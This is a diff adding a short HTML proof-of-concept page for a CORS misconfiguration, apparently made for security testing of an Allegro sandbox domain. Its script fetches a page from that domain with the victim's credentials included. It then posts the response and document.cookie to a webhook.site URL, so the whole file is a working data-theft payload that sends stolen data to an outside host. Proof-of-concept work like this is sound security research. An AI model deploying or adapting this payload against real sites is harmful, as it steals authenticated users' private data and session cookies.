@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - CORS Misconfiguration</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration PoC</h1>
+    <button id="exploit">Exploit</button>
+    <script>
+        document.getElementById("exploit").addEventListener("click", () => {
+            fetch("https://allegro.cz.allegrosandbox.pl/vyhledavani?string=test", {
+                method: "GET",
+                credentials: "include" // Incluye cookies o credenciales si el usuario está autenticado
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Envía la respuesta y las cookies al Webhook.site
+                fetch("https://webhook.site/7cbf4d39-ff45-4958-affd-0ff7435dceb6", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        response: data,
+                        cookies: document.cookie // Aquí se incluye las cookies
+                    })
+                });
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
